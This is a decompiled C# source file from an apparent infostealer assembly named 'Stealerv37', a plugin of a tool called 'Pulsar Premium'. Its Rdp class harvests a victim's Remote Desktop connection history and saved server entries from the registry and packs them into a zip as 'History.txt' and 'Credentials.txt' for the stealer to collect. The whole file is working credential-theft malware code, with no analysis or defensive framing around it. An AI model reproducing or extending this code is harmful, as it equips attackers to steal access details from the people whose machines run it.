// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.Rdp
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Microsoft.Win32;
using System;
using System.Text;

#nullable disable
namespace Intelix.Targets.Applications;

public class Rdp : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string name = "Software\\Microsoft\\Terminal Server Client";
    RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey(name);
    if (registryKey1 == null)
      return;
    string str1 = nameof (Rdp);
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = "RDP";
    RegistryKey registryKey2 = registryKey1.OpenSubKey("Default");
    if (registryKey2 != null)
    {
      StringBuilder stringBuilder = new StringBuilder();
      foreach (string valueName in registryKey2.GetValueNames())
      {
        try
        {
          object obj = registryKey2.GetValue(valueName);
          if (obj != null)
            stringBuilder.AppendLine(obj.ToString());
        }
        catch
        {
        }
      }
      if (stringBuilder.Length > 0)
      {
        string str2 = str1 + "\\History.txt";
        byte[] bytes = Encoding.UTF8.GetBytes(stringBuilder.ToString() + "\n");
        zip.AddFile(str2.Replace('\\', '/'), bytes);
        counterApplications.Files.Add($"{name}\\Default => {str2.Replace('\\', '/')}");
      }
    }
    RegistryKey registryKey3 = registryKey1.OpenSubKey("Servers");
    if (registryKey3 != null)
    {
      StringBuilder stringBuilder = new StringBuilder();
      foreach (string subKeyName in registryKey3.GetSubKeyNames())
      {
        try
        {
          RegistryKey registryKey4 = registryKey3.OpenSubKey(subKeyName);
          if (registryKey4 != null)
          {
            stringBuilder.AppendLine(subKeyName + ":");
            foreach (string valueName in registryKey4.GetValueNames())
            {
              try
              {
                object obj = registryKey4.GetValue(valueName);
                if (obj is byte[] numArray)
                {
                  string str3 = BitConverter.ToString(numArray).Replace("-", "");
                  stringBuilder.AppendLine($"{valueName}: {str3}");
                }
                else
                  stringBuilder.AppendLine($"{valueName}: {obj}");
              }
              catch
              {
              }
            }
            stringBuilder.AppendLine();
          }
        }
        catch
        {
        }
      }
      if (stringBuilder.Length > 0)
      {
        string str4 = str1 + "\\Credentials.txt";
        byte[] bytes = Encoding.UTF8.GetBytes(stringBuilder.ToString());
        zip.AddFile(str4.Replace('\\', '/'), bytes);
        counterApplications.Files.Add($"{name}\\Servers => {str4.Replace('\\', '/')}");
      }
    }
    if (counterApplications.Files.Count <= 0)
      return;
    counterApplications.Files.Add(str1);
    counter.Applications.Add(counterApplications);
  }
}
